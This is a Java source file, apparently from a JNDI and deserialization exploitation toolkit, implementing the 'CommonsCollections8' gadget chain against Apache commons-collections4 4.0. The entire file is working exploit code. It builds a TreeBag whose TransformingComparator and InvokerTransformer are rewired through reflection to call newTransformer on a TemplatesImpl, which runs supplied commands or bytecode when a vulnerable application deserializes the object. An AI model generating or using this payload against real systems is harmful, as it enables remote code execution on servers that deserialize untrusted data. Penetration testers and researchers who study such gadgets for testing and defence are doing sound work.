package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Comparator;

import static com.qi4l.jndi.Starter.cmdLine;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"navalorenzo"})

public class CommonsCollections8 implements ObjectPayload<TreeBag>{


    public TreeBag getObject(PayloadType type, String... param) throws Exception {
        final Object templates;
        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
            templates = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            templates = Gadgets.createTemplatesImpl(type, param);
        }
        InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
        TreeBag                tree        = new TreeBag((Comparator) comp);
        tree.add(templates);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return tree;
    }
}
